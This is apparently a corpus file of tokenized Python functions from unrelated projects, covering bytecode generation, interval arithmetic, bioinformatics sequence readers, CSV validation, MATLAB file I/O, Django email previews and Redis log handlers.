bdyl + 1 # Generate the POP_JUMP_IF_FALSE instruction bc += generate_simple_call ( tokens . POP_JUMP_IF_FALSE , gen_len ) # Add the body_bc bc += body_bc # Update previous_len prev_len = len ( previous ) + len ( bc ) return bc
def to_bytes_35 ( self , previous : bytes ) : # Calculations ahead. bc = b"" # Calculate the length of the iterator. it_bc = util . generate_bytecode_from_obb ( self . iterator , previous ) bc += it_bc # Push a get_iter on. bc += util . generate_bytecode_from_obb ( tokens . GET_ITER , b"" ) prev_len = len ( previous ) + len ( bc ) # Calculate the bytecode for the body. body_bc = b"" for op in self . _body : # Add padding bytes to the bytecode to allow if blocks to work. padded_bc = previous # Add padding for SETUP_LOOP padded_bc += b"\x00\x00\x00" padded_bc += bc # Add padding for FOR_ITER padded_bc += b"\x00\x00\x00" # Add previous body padded_bc += body_bc body_bc += util . generate_bytecode_from_obb ( op , padded_bc ) # Add a JUMP_ABSOLUTE body_bc += util . generate_simple_call ( tokens . JUMP_ABSOLUTE , prev_len + 3 ) # Add a POP_TOP body_bc += util . generate_bytecode_from_obb ( tokens . POP_BLOCK , b"" ) # Calculate the right lengths. # Add a FOR_ITER, using len(body_bc) body_bc = util . generate_simple_call ( tokens . FOR_ITER , len ( body_bc ) - 1 ) + body_bc # Add the SETUP_LOOP call bc = util . generate_simple_call ( tokens . SETUP_LOOP , prev_len + len ( body_bc ) - 6 ) + bc + body_bc return bc
def to_bytes_36 ( self , previous : bytes ) : # Calculations ahead. bc = b"" # Calculate the length of the iterator. it_bc = util . generate_bytecode_from_obb ( self . iterator , previous ) bc += it_bc bc += util . ensure_instruction ( tokens . GET_ITER )
def validate_content ( * objs ) : from . main import Collection , Module validator = { Collection : cnxml . validate_collxml , Module : cnxml . validate_cnxml , } [ type ( objs [ 0 ] ) ] return validator ( * [ obj . file for obj in objs ] )
def intersection ( l1 , l2 ) : if len ( l1 ) == 0 or len ( l2 ) == 0 : return [ ] out = [ ] l2_pos = 0 for l in l1 : while l2_pos < len ( l2 ) and l2 [ l2_pos ] . end < l . start : l2_pos += 1 if l2_pos == len ( l2 ) : break while l2_pos < len ( l2 ) and l . intersects ( l2 [ l2_pos ] ) : out . append ( l . intersection ( l2 [ l2_pos ] ) ) l2_pos += 1 l2_pos = max ( 0 , l2_pos - 1 ) return out
def distance_to_point ( self , p ) : if self . start <= p <= self . end : return 0 else : return min ( abs ( self . start - p ) , abs ( self . end - p ) )
def intersects ( self , i ) : return self . start <= i . end and i . start <= self . end
def contains ( self , i ) : return self . start <= i . start and i . end <= self . end
def union ( self , i ) : if self . intersects ( i ) or self . end + 1 == i . start or i . end + 1 == self . start : return Interval ( min ( self . start , i . start ) , max ( self . end , i . end ) ) else : return None
def union_fill_gap ( self , i ) : return Interval ( min ( self . start , i . start ) , max ( self . end , i . end ) )
def intersection ( self , i ) : if self . intersects ( i ) : return Interval ( max ( self . start , i . start ) , min ( self . end , i . end ) ) else : return None
def file_reader ( fname , read_quals = False ) : f = utils . open_file_read ( fname ) line = f . readline ( ) phylip_regex = re . compile ( '^\s*[0-9]+\s+[0-9]+$' ) gbk_regex = re . compile ( '^LOCUS\s+\S' ) if line . startswith ( '>' ) : seq = Fasta ( ) previous_lines [ f ] = line elif line . startswith ( '##gff-version 3' ) : seq = Fasta ( ) # if a GFF file, need to skip past all the annotation # and get to the fasta sequences at the end of the file while not line . startswith ( '>' ) : line = f . readline ( ) if not line : utils . close ( f ) raise Error ( 'No sequences found in GFF file "' + fname + '"' ) seq = Fasta ( ) previous_lines [ f ] = line elif line . startswith ( 'ID   ' ) and line [ 5 ] != ' ' : seq = Embl ( ) previous_lines [ f ] = line elif gbk_regex . search ( line ) : seq = Embl ( ) previous_lines [ f ] = line elif line . startswith ( '@' ) : seq = Fastq ( ) previous_lines [ f ] = line elif phylip_regex . search ( line ) : # phylip format could be interleaved or not, need to look at next # couple of lines to figure that out. Don't expect these files to # be too huge, so just store all the sequences in memory number_of_seqs , bases_per_seq = line . strip ( ) . split ( ) number_of_seqs = int ( number_of_seqs ) bases_per_seq = int ( bases_per_seq ) got_blank_line = False first_line = line seq_lines = [ ] while 1 : line = f . readline ( ) if line == '' : break elif line == '\n' : got_blank_line = True else : seq_lines . append ( line . rstrip ( ) ) utils . close ( f ) if len ( seq_lines ) == 1 or len ( seq_lines ) == number_of_seqs : sequential = True elif seq_lines [ 0 ] [ 10 ] != ' ' and seq_lines [ 1 ] [ 10 ] == ' ' : sequential = True else : sequential = False # if the 11th char of second sequence line is a space,  then the file is sequential, e.g.: # GAGCCCGGGC AATACAGGGT AT # as opposed to: # Salmo gairAAGCCTTGGC AGTGCAGGGT if sequential : current_id = None current_seq = '' for line in seq_lines : if len ( current_seq ) == bases_per_seq or len ( current_seq ) == 0 : if current_id is not None : yield Fasta ( current_id , current_seq . replace ( '-' , '' ) ) current_seq = '' current_id , new_bases = line [ 0 : 10 ] . rstrip ( ) , line . rstrip ( ) [ 10 : ] else : new_bases = line . rstrip ( ) current_seq += new_bases . replace ( ' ' , '' ) yield Fasta ( current_id , current_seq . replace ( '-' , '' ) ) else : # seaview files start all seqs at pos >=12. Other files start # their sequence at the start of the line if seq_lines [ number_of_seqs + 1 ] [ 0 ] == ' ' : first_gap_pos = seq_lines [ 0 ] . find ( ' ' ) end_of_gap = first_gap_pos while seq_lines [ 0 ] [ end_of_gap ] == ' ' : end_of_gap += 1 first_seq_base = end_of_gap else : first_seq_base = 10 seqs = [ ] for i in range ( number_of_seqs ) : name , bases = seq_lines [ i ] [ 0 : first_seq_base ] . rstrip ( ) , seq_lines [ i ] [ first_seq_base : ] seqs . append ( Fasta ( name , bases ) ) for i in range ( number_of_seqs , len ( seq_lines ) ) : seqs [ i % number_of_seqs ] . seq += seq_lines [ i ] for fa in seqs : fa . seq = fa . seq . replace ( ' ' , '' ) . replace ( '-' , '' ) yield fa return elif line == '' : utils . close ( f ) return else : utils . close ( f ) raise Error ( 'Error determining file type from file "' + fname + '". First line is:\n' + line . rstrip ( ) ) try : while seq . get_next_from_file ( f , read_quals ) : yield seq finally : utils . close ( f )
def subseq ( self , start , end ) : return Fasta ( self . id , self . seq [ start : end ] )
def expand_nucleotides ( self ) : s = list ( self . seq ) for i in range ( len ( s ) ) : if s [ i ] in redundant_nts : s [ i ] = '' . join ( redundant_nts [ s [ i ] ] ) seqs = [ ] for x in itertools . product ( * s ) : seqs . append ( Fasta ( self . id + '.' + str ( len ( seqs ) + 1 ) , '' . join ( x ) ) ) return seqs
def replace_bases ( self , old , new ) : self . seq = self . seq . replace ( old , new )
def replace_interval ( self , start , end , new ) : if start > end or start > len ( self ) - 1 or end > len ( self ) - 1 : raise Error ( 'Error replacing bases ' + str ( start ) + '-' + str ( end ) + ' in sequence ' + self . id ) self . seq = self . seq [ 0 : start ] + new + self . seq [ end + 1 : ]
def gaps ( self , min_length = 1 ) : gaps = [ ] regex = re . compile ( 'N+' , re . IGNORECASE ) for m in regex . finditer ( self . seq ) : if m . span ( ) [ 1 ] - m . span ( ) [ 0 ] + 1 >= min_length : gaps . append ( intervals . Interval ( m . span ( ) [ 0 ] , m . span ( ) [ 1 ] - 1 ) ) return gaps
def to_Fastq ( self , qual_scores ) : if len ( self ) != len ( qual_scores ) : raise Error ( 'Error making Fastq from Fasta, lengths differ.' , self . id ) return Fastq ( self . id , self . seq , '' . join ( [ chr ( max ( 0 , min ( x , 93 ) ) + 33 ) for x in qual_scores ] ) )
def translate ( self , frame = 0 ) : return Fasta ( self . id , '' . join ( [ genetic_codes . codes [ genetic_code ] . get ( self . seq [ x : x + 3 ] . upper ( ) , 'X' ) for x in range ( frame , len ( self ) - 1 - frame , 3 ) ] ) )
def subseq ( self , start , end ) : return Fastq ( self . id , self . seq [ start : end ] , self . qual [ start : end ] )
def trim_Ns ( self ) : # get index of first base that is not an N i = 0 while i < len ( self ) and self . seq [ i ] in 'nN' : i += 1 # strip off start of sequence and quality self . seq = self . seq [ i : ] self . qual = self . qual [ i : ] # strip the ends self . seq = self . seq . rstrip ( 'Nn' ) self . qual = self . qual [ : len ( self . seq ) ]
def replace_interval ( self , start , end , new , qual_string ) : if len ( new ) != len ( qual_string ) : raise Error ( 'Length of new seq and qual string in replace_interval() must be equal. Cannot continue' ) super ( ) . replace_interval ( start , end , new ) self . qual = self . qual [ 0 : start ] + qual_string + self . qual [ end + 1 : ]
def translate ( self ) : fa = super ( ) . translate ( ) return Fastq ( fa . id , fa . seq , 'I' * len ( fa . seq ) )
def count_sequences ( infile ) : seq_reader = sequences . file_reader ( infile ) n = 0 for seq in seq_reader : n += 1 return n
def make_random_contigs ( contigs , length , outfile , name_by_letters = False , prefix = '' , seed = None , first_number = 1 ) : random . seed ( a = seed ) fout = utils . open_file_write ( outfile ) letters = list ( 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' ) letters_index = 0 for i in range ( contigs ) : if name_by_letters : name = letters [ letters_index ] letters_index += 1 if letters_index == len ( letters ) : letters_index = 0 else : name = str ( i + first_number ) fa = sequences . Fasta ( prefix + name , '' . join ( [ random . choice ( 'ACGT' ) for x in range ( length ) ] ) ) print ( fa , file = fout ) utils . close ( fout )
def mean_length ( infile , limit = None ) : total = 0 count = 0 seq_reader = sequences . file_reader ( infile ) for seq in seq_reader : total += len ( seq ) count += 1 if limit is not None and count >= limit : break assert count > 0 return total / count
def merge_to_one_seq ( infile , outfile , seqname = 'union' ) : seq_reader = sequences . file_reader ( infile ) seqs = [ ] for seq in seq_reader : seqs . append ( copy . copy ( seq ) ) new_seq = '' . join ( [ seq . seq for seq in seqs ] ) if type ( seqs [ 0 ] ) == sequences . Fastq : new_qual = '' . join ( [ seq . qual for seq in seqs ] ) seqs [ : ] = [ ] merged = sequences . Fastq ( seqname , new_seq , new_qual ) else : merged = sequences . Fasta ( seqname , new_seq ) seqs [ : ] = [ ] f = utils . open_file_write ( outfile ) print ( merged , file = f ) utils . close ( f )
def sort_by_size ( infile , outfile , smallest_first = False ) : seqs = { } file_to_dict ( infile , seqs ) seqs = list ( seqs . values ( ) ) seqs . sort ( key = lambda x : len ( x ) , reverse = not smallest_first ) fout = utils . open_file_write ( outfile ) for seq in seqs : print ( seq , file = fout ) utils . close ( fout )
def sort_by_name ( infile , outfile ) : seqs = { } file_to_dict ( infile , seqs ) #seqs = list(seqs.values()) #seqs.sort() fout = utils . open_file_write ( outfile ) for name in sorted ( seqs ) : print ( seqs [ name ] , file = fout ) utils . close ( fout )
def to_fastg ( infile , outfile , circular = None ) : if circular is None : to_circularise = set ( ) elif type ( circular ) is not set : f = utils . open_file_read ( circular ) to_circularise = set ( [ x . rstrip ( ) for x in f . readlines ( ) ] ) utils . close ( f ) else : to_circularise = circular seq_reader = sequences . file_reader ( infile ) fout = utils . open_file_write ( outfile ) nodes = 1 for seq in seq_reader : new_id = '_' . join ( [ 'NODE' , str ( nodes ) , 'length' , str ( len ( seq ) ) , 'cov' , '1' , 'ID' , seq . id ] ) if seq . id in to_circularise : seq . id = new_id + ':' + new_id + ';' print ( seq , file = fout ) seq . revcomp ( ) seq . id = new_id + "':" + new_id + "';" print ( seq , file = fout ) else : seq . id = new_id + ';' print ( seq , file = fout ) seq . revcomp ( ) seq . id = new_id + "';" print ( seq , file = fout ) nodes += 1 utils . close ( fout )
def to_boulderio ( infile , outfile ) : seq_reader = sequences . file_reader ( infile ) f_out = utils . open_file_write ( outfile ) for sequence in seq_reader : print ( "SEQUENCE_ID=" + sequence . id , file = f_out ) print ( "SEQUENCE_TEMPLATE=" + sequence . seq , file = f_out ) print ( "=" , file = f_out ) utils . close ( f_out )
def value_to_string ( self , obj ) : value = self . value_from_object ( obj ) return b64encode ( self . _dump ( value ) ) . decode ( 'ascii' )
def get_version ( version = None ) : version = get_complete_version ( version ) # Now build the two parts of the version number: # main = X.Y[.Z] # sub = .devN - for pre-alpha releases #     | {a|b|c}N - for alpha, beta and rc releases main = get_main_version ( version ) sub = '' if version [ 3 ] == 'alpha' and version [ 4 ] == 0 : git_changeset = get_git_changeset ( ) if git_changeset : sub = '.dev%s' % git_changeset elif version [ 3 ] != 'final' : mapping = { 'alpha' : 'a' , 'beta' : 'b' , 'rc' : 'c' } sub = mapping [ version [ 3 ] ] + str ( version [ 4 ] ) return str ( main + sub )
def _init_unique_sets ( self ) : ks = dict ( ) for t in self . _unique_checks : key = t [ 0 ] ks [ key ] = set ( ) # empty set return ks
def _apply_value_checks ( self , i , r , summarize = False , report_unexpected_exceptions = True , context = None ) : for field_name , check , code , message , modulus in self . _value_checks : if i % modulus == 0 : # support sampling fi = self . _field_names . index ( field_name ) if fi < len ( r ) : # only apply checks if there is a value value = r [ fi ] try : check ( value ) except ValueError : p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'column' ] = fi + 1 p [ 'field' ] = field_name p [ 'value' ] = value p [ 'record' ] = r if context is not None : p [ 'context' ] = context yield p except Exception as e : if report_unexpected_exceptions : p = { 'code' : UNEXPECTED_EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED_EXCEPTION ] % ( e . __class__ . __name__ , e ) p [ 'row' ] = i + 1 p [ 'column' ] = fi + 1 p [ 'field' ] = field_name p [ 'value' ] = value p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( check . __name__ , check . __doc__ ) if context is not None : p [ 'context' ] = context yield p
def _apply_header_checks ( self , i , r , summarize = False , context = None ) : for code , message in self . _header_checks : if tuple ( r ) != self . _field_names : p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = tuple ( r ) p [ 'missing' ] = set ( self . _field_names ) - set ( r ) p [ 'unexpected' ] = set ( r ) - set ( self . _field_names ) if context is not None : p [ 'context' ] = context yield p
def _apply_record_length_checks ( self , i , r , summarize = False , context = None ) : for code , message , modulus in self . _record_length_checks : if i % modulus == 0 : # support sampling if len ( r ) != len ( self . _field_names ) : p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'length' ] = len ( r ) if context is not None : p [ 'context' ] = context yield p
def _apply_value_predicates ( self , i , r , summarize = False , report_unexpected_exceptions = True , context = None ) : for field_name , predicate , code , message , modulus in self . _value_predicates : if i % modulus == 0 : # support sampling fi = self . _field_names . index ( field_name ) if fi < len ( r ) : # only apply predicate if there is a value value = r [ fi ] try : valid = predicate ( value ) if not valid : p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'column' ] = fi + 1 p [ 'field' ] = field_name p [ 'value' ] = value p [ 'record' ] = r if context is not None : p [ 'context' ] = context yield p except Exception as e : if report_unexpected_exceptions : p = { 'code' : UNEXPECTED_EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED_EXCEPTION ] % ( e . __class__ . __name__ , e ) p [ 'row' ] = i + 1 p [ 'column' ] = fi + 1 p [ 'field' ] = field_name p [ 'value' ] = value p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( predicate . __name__ , predicate . __doc__ ) if context is not None : p [ 'context' ] = context yield p
def _apply_record_checks ( self , i , r , summarize = False , report_unexpected_exceptions = True , context = None ) : for check , modulus in self . _record_checks : if i % modulus == 0 : # support sampling rdict = self . _as_dict ( r ) try : check ( rdict ) except RecordError as e : code = e . code if e . code is not None else RECORD_CHECK_FAILED p = { 'code' : code } if not summarize : message = e . message if e . message is not None else MESSAGES [ RECORD_CHECK_FAILED ] p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = r if context is not None : p [ 'context' ] = context if e . details is not None : p [ 'details' ] = e . details yield p except Exception as e : if report_unexpected_exceptions : p = { 'code' : UNEXPECTED_EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED_EXCEPTION ] % ( e . __class__ . __name__ , e ) p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( check . __name__ , check . __doc__ ) if context is not None : p [ 'context' ] = context yield p
def _apply_record_predicates ( self , i , r , summarize = False , report_unexpected_exceptions = True , context = None ) : for predicate , code , message , modulus in self . _record_predicates : if i % modulus == 0 : # support sampling rdict = self . _as_dict ( r ) try : valid = predicate ( rdict ) if not valid : p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = r if context is not None : p [ 'context' ] = context yield p except Exception as e : if report_unexpected_exceptions : p = { 'code' : UNEXPECTED_EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED_EXCEPTION ] % ( e . __class__ . __name__ , e ) p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( predicate . __name__ , predicate . __doc__ ) if context is not None : p [ 'context' ] = context yield p
def _apply_unique_checks ( self , i , r , unique_sets , summarize = False , context = None ) : for key , code , message in self . _unique_checks : value = None values = unique_sets [ key ] if isinstance ( key , basestring ) : # assume key is a field name fi = self . _field_names . index ( key ) if fi >= len ( r ) : continue value = r [ fi ] else : # assume key is a list or tuple, i.e., compound key value = [ ] for f in key : fi = self . _field_names . index ( f ) if fi >= len ( r ) : break value . append ( r [ fi ] ) value = tuple ( value ) # enable hashing if value in values : p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'key' ] = key p [ 'value' ] = value if context is not None : p [ 'context' ] = context yield p values . add ( value )
def _apply_each_methods ( self , i , r , summarize = False , report_unexpected_exceptions = True , context = None ) : for a in dir ( self ) : if a . startswith ( 'each' ) : rdict = self . _as_dict ( r ) f = getattr ( self , a ) try : f ( rdict ) except Exception as e : if report_unexpected_exceptions : p = { 'code' : UNEXPECTED_EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED_EXCEPTION ] % ( e . __class__ . __name__ , e ) p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( f . __name__ , f . __doc__ ) if context is not None : p [ 'context' ] = context yield p
def _apply_assert_methods ( self , i , r , summarize = False , report_unexpected_exceptions = True , context = None ) : for a in dir ( self ) : if a . startswith ( 'assert' ) : rdict = self . _as_dict ( r ) f = getattr ( self , a ) try : f ( rdict ) except AssertionError as e : code = ASSERT_CHECK_FAILED message = MESSAGES [ ASSERT_CHECK_FAILED ] if len ( e . args ) > 0 : custom = e . args [ 0 ] if isinstance ( custom , ( list , tuple ) ) : if len ( custom ) > 0 : code = custom [ 0 ] if len ( custom ) > 1 : message = custom [ 1 ] else : code = custom p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = r if context is not None : p [ 'context' ] = context yield p except Exception as e : if report_unexpected_exceptions : p = { 'code' : UNEXPECTED_EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED_EXCEPTION ] % ( e . __class__ . __name__ , e ) p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( f . __name__ , f . __doc__ ) if context is not None : p [ 'context' ] = context yield p
def _apply_check_methods ( self , i , r , summarize = False , report_unexpected_exceptions = True , context = None ) : for a in dir ( self ) : if a . startswith ( 'check' ) : rdict = self . _as_dict ( r ) f = getattr ( self , a ) try : f ( rdict ) except RecordError as e : code = e . code if e . code is not None else RECORD_CHECK_FAILED p = { 'code' : code } if not summarize : message = e . message if e . message is not None else MESSAGES [ RECORD_CHECK_FAILED ] p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = r if context is not None : p [ 'context' ] = context if e . details is not None : p [ 'details' ] = e . details yield p except Exception as e : if report_unexpected_exceptions : p = { 'code' : UNEXPECTED_EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED_EXCEPTION ] % ( e . __class__ . __name__ , e ) p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( f . __name__ , f . __doc__ ) if context is not None : p [ 'context' ] = context yield p
def _apply_skips ( self , i , r , summarize = False , report_unexpected_exceptions = True , context = None ) : for skip in self . _skips : try : result = skip ( r ) if result is True : yield True except Exception as e : if report_unexpected_exceptions : p = { 'code' : UNEXPECTED_EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED_EXCEPTION ] % ( e . __class__ . __name__ , e ) p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( skip . __name__ , skip . __doc__ ) if context is not None : p [ 'context' ] = context yield p
def _as_dict ( self , r ) : d = dict ( ) for i , f in enumerate ( self . _field_names ) : d [ f ] = r [ i ] if i < len ( r ) else None return d
def create_validator ( ) : field_names = ( 'study_id' , 'patient_id' , 'gender' , 'age_years' , 'age_months' , 'date_inclusion' ) validator = CSVValidator ( field_names ) # basic header and record length checks validator . add_header_check ( 'EX1' , 'bad header' ) validator . add_record_length_check ( 'EX2' , 'unexpected record length' ) # some simple value checks validator . add_value_check ( 'study_id' , int , 'EX3' , 'study id must be an integer' ) validator . add_value_check ( 'patient_id' , int , 'EX4' , 'patient id must be an integer' ) validator . add_value_check ( 'gender' , enumeration ( 'M' , 'F' ) , 'EX5' , 'invalid gender' ) validator . add_value_check ( 'age_years' , number_range_inclusive ( 0 , 120 , int ) , 'EX6' , 'invalid age in years' ) validator . add_value_check ( 'date_inclusion' , datetime_string ( '%Y-%m-%d' ) , 'EX7' , 'invalid date' ) # a more complicated record check def check_age_variables ( r ) : age_years = int ( r [ 'age_years' ] ) age_months = int ( r [ 'age_months' ] ) valid = ( age_months >= age_years * 12 and age_months % age_years < 12 ) if not valid : raise RecordError ( 'EX8' , 'invalid age variables' ) validator . add_record_check ( check_age_variables ) return validator
def read_header ( fd , endian ) : flag_class , nzmax = read_elements ( fd , endian , [ 'miUINT32' ] ) header = { 'mclass' : flag_class & 0x0FF , 'is_logical' : ( flag_class >> 9 & 1 ) == 1 , 'is_global' : ( flag_class >> 10 & 1 ) == 1 , 'is_complex' : ( flag_class >> 11 & 1 ) == 1 , 'nzmax' : nzmax } header [ 'dims' ] = read_elements ( fd , endian , [ 'miINT32' ] ) header [ 'n_dims' ] = len ( header [ 'dims' ] ) if header [ 'n_dims' ] != 2 : raise ParseError ( 'Only matrices with dimension 2 are supported.' ) header [ 'name' ] = read_elements ( fd , endian , [ 'miINT8' ] , is_name = True ) return header
def eof ( fd ) : b = fd . read ( 1 ) end = len ( b ) == 0 if not end : curpos = fd . tell ( ) fd . seek ( curpos - 1 ) return end
def write_var_data ( fd , data ) : # write array data elements (size info) fd . write ( struct . pack ( 'b3xI' , etypes [ 'miMATRIX' ] [ 'n' ] , len ( data ) ) ) # write the data fd . write ( data )
def write_compressed_var_array ( fd , array , name ) : bd = BytesIO ( ) write_var_array ( bd , array , name ) data = zlib . compress ( bd . getvalue ( ) ) bd . close ( ) # write array data elements (size info) fd . write ( struct . pack ( 'b3xI' , etypes [ 'miCOMPRESSED' ] [ 'n' ] , len ( data ) ) ) # write the compressed data fd . write ( data )
def write_numeric_array ( fd , header , array ) : # make a memory file for writing array data bd = BytesIO ( ) # write matrix header to memory file write_var_header ( bd , header ) if not isinstance ( array , basestring ) and header [ 'dims' ] [ 0 ] > 1 : # list array data in column major order array = list ( chain . from_iterable ( izip ( * array ) ) ) # write matrix data to memory file write_elements ( bd , header [ 'mtp' ] , array ) # write the variable to disk file data = bd . getvalue ( ) bd . close ( ) write_var_data ( fd , data )
def raise_for_status ( self ) : if not self . status : return error = find_exception_by_code ( self . status ) message = None screen = None stacktrace = None if isinstance ( self . value , str ) : message = self . value elif isinstance ( self . value , dict ) : message = self . value . get ( 'message' , None ) screen = self . value . get ( 'screen' , None ) stacktrace = self . value . get ( 'stacktrace' , None ) raise WebDriverException ( error , message , screen , stacktrace )
def fluent ( func ) : @ wraps ( func ) def fluent_interface ( instance , * args , * * kwargs ) : ret = func ( instance , * args , * * kwargs ) if ret is not None : return ret return instance return fluent_interface
def check_unused_args ( self , used_args , args , kwargs ) : for k , v in kwargs . items ( ) : if k in used_args : self . _used_kwargs . update ( { k : v } ) else : self . _unused_kwargs . update ( { k : v } )
def vformat ( self , format_string , args , kwargs ) : self . _used_kwargs = { } self . _unused_kwargs = { } return super ( MemorizeFormatter , self ) . vformat ( format_string , args , kwargs )
def PlugIn ( self ) : ids = self . available_ids ( ) if len ( ids ) == 0 : raise MaxInputsReachedError ( 'Max Inputs Reached' ) self . id = ids [ 0 ] _xinput . PlugIn ( self . id ) while self . id in self . available_ids ( ) : pass
def UnPlug ( self , force = False ) : if force : _xinput . UnPlugForce ( c_uint ( self . id ) ) else : _xinput . UnPlug ( c_uint ( self . id ) ) while self . id not in self . available_ids ( ) : if self . id == 0 : break
def main ( ) : import time print ( 'Testing controller in position 1:' ) print ( 'Running 3 x 3 seconds tests' ) # Initialise Controller con = rController ( 1 ) # Loop printing controller state and buttons held for i in range ( 3 ) : print ( 'Waiting...' ) time . sleep ( 2.5 ) print ( 'State: ' , con . gamepad ) print ( 'Buttons: ' , con . buttons ) time . sleep ( 0.5 ) print ( 'Done!' )
def buttons ( self ) : return [ name for name , value in rController . _buttons . items ( ) if self . gamepad . wButtons & value == value ]
def maybe_decode_header ( header ) : value , encoding = decode_header ( header ) [ 0 ] if encoding : return value . decode ( encoding ) else : return value
def autodiscover ( ) : from django . conf import settings for application in settings . INSTALLED_APPS : module = import_module ( application ) if module_has_submodule ( module , 'emails' ) : emails = import_module ( '%s.emails' % application ) try : import_module ( '%s.emails.previews' % application ) except ImportError : # Only raise the exception if this module contains previews and # there was a problem importing them. (An emails module that # does not contain previews is not an error.) if module_has_submodule ( emails , 'previews' ) : raise
def register ( self , cls ) : preview = cls ( site = self ) logger . debug ( 'Registering %r with %r' , preview , self ) index = self . __previews . setdefault ( preview . module , { } ) index [ cls . __name__ ] = preview
def detail_view ( self , request , module , preview ) : try : preview = self . __previews [ module ] [ preview ] except KeyError : raise Http404 # The provided module/preview does not exist in the index. return preview . detail_view ( request )
def url ( self ) : return reverse ( '%s:detail' % URL_NAMESPACE , kwargs = { 'module' : self . module , 'preview' : type ( self ) . __name__ , } )
def detail_view ( self , request ) : context = { 'preview' : self , } kwargs = { } if self . form_class : if request . GET : form = self . form_class ( data = request . GET ) else : form = self . form_class ( ) context [ 'form' ] = form if not form . is_bound or not form . is_valid ( ) : return render ( request , 'mailviews/previews/detail.html' , context ) kwargs . update ( form . get_message_view_kwargs ( ) ) message_view = self . get_message_view ( request , * * kwargs ) message = message_view . render_to_message ( ) raw = message . message ( ) headers = OrderedDict ( ( header , maybe_decode_header ( raw [ header ] ) ) for header in self . headers ) context . update ( { 'message' : message , 'subject' : message . subject , 'body' : message . body , 'headers' : headers , 'raw' : raw . as_string ( ) , } ) alternatives = getattr ( message , 'alternatives' , [ ] ) try : html = next ( alternative [ 0 ] for alternative in alternatives if alternative [ 1 ] == 'text/html' ) context . update ( { 'html' : html , 'escaped_html' : b64encode ( html . encode ( 'utf-8' ) ) , } ) except StopIteration : pass return render ( request , self . template_name , context )
def execute_from_command_line ( argv = None ) : parser = argparse . ArgumentParser ( description = __doc__ ) parser . add_argument ( '--monitors-dir' , default = MONITORS_DIR ) parser . add_argument ( '--alerts-dir' , default = ALERTS_DIR ) parser . add_argument ( '--config' , default = SMA_INI_FILE ) parser . add_argument ( '--warning' , help = 'set logging to warning' , action = 'store_const' , dest = 'loglevel' , const = logging . WARNING , default = logging . INFO ) parser . add_argument ( '--quiet' , help = 'set logging to ERROR' , action = 'store_const' , dest = 'loglevel' , const = logging . ERROR , default = logging . INFO ) parser . add_argument ( '--debug' , help = 'set logging to DEBUG' , action = 'store_const' , dest = 'loglevel' , const = logging . DEBUG , default = logging . INFO ) parser . add_argument ( '--verbose' , help = 'set logging to COMM' , action = 'store_const' , dest = 'loglevel' , const = 5 , default = logging . INFO ) parser . sub = parser . add_subparsers ( ) parse_service = parser . sub . add_parser ( 'service' , help = 'Run SMA as service (daemon).' ) parse_service . set_defaults ( which = 'service' ) parse_oneshot = parser . sub . add_parser ( 'one-shot' , help = 'Run SMA once and exit' ) parse_oneshot . set_defaults ( which = 'one-shot' ) parse_alerts = parser . sub . add_parser ( 'alerts' , help = 'Alerts options.' ) parse_alerts . set_defaults ( which = 'alerts' ) parse_alerts . add_argument ( '--test' , help = 'Test alert' , action = 'store_true' ) parse_alerts . add_argument ( 'alert_section' , nargs = '?' , help = 'Alert section to see' ) parse_results = parser . sub . add_parser ( 'results' , help = 'Monitors results' ) parse_results . set_defaults ( which = 'results' ) parser . set_default_subparser ( 'one-shot' ) args = parser . parse_args ( argv [ 1 : ] ) create_logger ( 'sma' , args . loglevel ) if not getattr ( args , 'which' , None ) or args . which == 'one-shot' : sma = SMA ( args . monitors_dir , args . alerts_dir , args . config ) sma . evaluate_and_alert ( ) elif args . which == 'service' : sma = SMAService ( args . monitors_dir , args . alerts_dir , args . config ) sma . start ( ) elif args . which == 'alerts' and args . test : sma = SMA ( args . monitors_dir , args . alerts_dir , args . config ) sma . alerts . test ( ) elif args . which == 'results' : print ( SMA ( args . monitors_dir , args . alerts_dir , args . config ) . results )
def emit ( self , record ) : try : self . redis_client . publish ( self . channel , self . format ( record ) ) except redis . RedisError : pass
def emit ( self , record ) : try : if self . max_messages : p = self . redis_client . pipeline ( ) p . rpush ( self . key , self . format ( record ) ) p . ltrim ( self . key , - self . max_messages , - 1 ) p . execute ( ) else : self . redis_client . rpush ( self . key , self . format ( record ) ) except redis . RedisError : pass
